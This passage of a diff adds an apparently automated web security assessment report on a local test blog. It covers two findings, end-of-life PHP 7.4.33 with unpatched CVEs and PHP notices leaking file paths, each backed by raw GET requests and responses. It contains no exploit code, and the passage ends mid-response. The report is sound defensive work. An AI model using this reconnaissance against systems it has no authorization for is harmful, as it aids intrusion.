+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;a href=&quot;admin.php&quot;&gt;Admin Login&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 3. [vulnerable-component] End-of-life PHP 7.4.33 — unsupported branch, unpatched CVE-2023-3824 (phar overflow → RCE) &amp; CVE-2023-3823 (XXE)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32821/</div>
+<div class="desc">VERSION-BASED finding (matched by banner, not exploited). The application exposes `X-Powered-By: PHP/7.4.33` (and a `PHPSESSID` cookie) on its responses. PHP 7.4.33 (released 2022-11-03) is the FINAL release of the PHP 7.4 branch, which reached End-of-Life on 2022-11-28 — it receives NO further security updates. Beyond the general EOL exposure, concrete CVEs disclosed after 7.4's EOL were fixed only in supported 8.x branches and never backported to 7.4: CVE-2023-3824 (buffer overflow / use-after-free in PHAR directory-entry parsing → memory disclosure and potential remote code execution, CVSS ~9.4); CVE-2023-3823 (external-entity loading in PHP's XML handling → local file disclosure / SSRF-style info disclosure, CVSS 8.6); plus later 8.x fixes such as CVE-2024-2756 (__Host-/__Secure- cookie spoofing) and CVE-2024-5458 (filter_var URL-validation bypass) that 7.4 will never receive. NOTE: CVE-2024-4577 (php-cgi argument-injection RCE) is Windows-locale-specific and is most likely NOT applicable to this Debian host. Severity high: the branch is unsupported AND has an unpatched RCE-class CVE (CVE-2023-3824), though neither was actively exploited here. Operator action: migrate to a supported PHP release (8.2/8.3+). Also disable `expose_php` (stop emitting X-Powered-By) — note the same pages leak `Notice: Undefined variable ... in /var/www/html/index.php`, indicating display_errors is on, which compounds the EOL exposure.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32821/ → 200; response header `X-Powered-By: PHP/7.4.33` and `Set-Cookie: PHPSESSID=...` (ev-mqy3r4iy-1r). 2. GET http://target.local:32821/index.php → identical 200 with the same `X-Powered-By: PHP/7.4.33` (ev-mqy3r58w-1s) — stable across requests. 3. Negative control: GET a non-existent path → 404 with a different body (ev-mqy3r65a-1t). Map PHP 7.4.33 to the EOL date (2022-11-28) and the unpatched CVE list above.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3r65a-1t</code> — <code>artifacts/_/ev-mqy3r65a-1t/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-path-xyz-404 HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 18:08:27 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32821&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3r4iy-1r</code> — <code>artifacts/_/ev-mqy3r4iy-1r/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 5666
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:08:25 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;a href=&quot;admin.php&quot;&gt;Admin Login&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3r58w-1s</code> — <code>artifacts/_/ev-mqy3r58w-1s/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 5666
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 18:08:26 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;a href=&quot;admin.php&quot;&gt;Admin Login&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 4. [info-disclosure] PHP error notices leak server path and language on every page load</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32821/</div>
+<div class="desc">The root page emits PHP `Notice`-level errors in its HTML response on every request: `Notice: Undefined variable: category in /var/www/html/index.php on line 28` — repeated six times per page load. This discloses the server-side language (PHP), the full filesystem path (`/var/www/html/index.php`), and a code defect (uninitialized variable) in plaintext. No user interaction or special input is required; the errors appear regardless of whether a `category` query parameter is supplied.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32821/ (no parameters needed).
+2. Observe the HTML body: six occurrences of `&amp;lt;b&amp;gt;Notice&amp;lt;/b&amp;gt;: Undefined variable: category in &amp;lt;b&amp;gt;/var/www/html/index.php&amp;lt;/b&amp;gt; on line &amp;lt;b&amp;gt;28&amp;lt;/b&amp;gt;` are present in plaintext between dropdown `&amp;lt;option&amp;gt;` tags.
+3. Compare with GET /styles.css — a static resource returns no PHP notices.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3bbs5-c</code> — <code>artifacts/s-0001/ev-mqy3bbs5-c/</code></div><div class="lbl">REQUEST</div><pre>GET /styles.css HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+accept-ranges: bytes
+connection: Keep-Alive
+content-length: 453
+content-type: text/css
+date: Sun, 28 Jun 2026 17:56:08 GMT
+etag: &quot;1c5-6553e0413be40-gzip&quot;
+keep-alive: timeout=5, max=100
+last-modified: Sat, 27 Jun 2026 15:38:25 GMT
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f9;
+    margin: 0;
+    padding: 20px;
+}
+.container {
+    width: 80%;
+    margin: auto;
+    background: white;
+    padding: 20px;
+    border-radius: 8px;
+}
+.post {
+    border-bottom: 1px solid #ccc;
+    padding-bottom: 20px;
+    margin-bottom: 20px;
+}
+.post h2 a {
+    color: #333;
+    text-decoration: none;
+}
+.post img {
+    width: 100%;
+    height: auto;
+    border-radius: 5px;
+}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy39ipy-4</code> — <code>artifacts/s-0001/ev-mqy39ipy-4/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 5666
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 17:54:43 GMT
+keep-alive: timeout=5, max=65
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
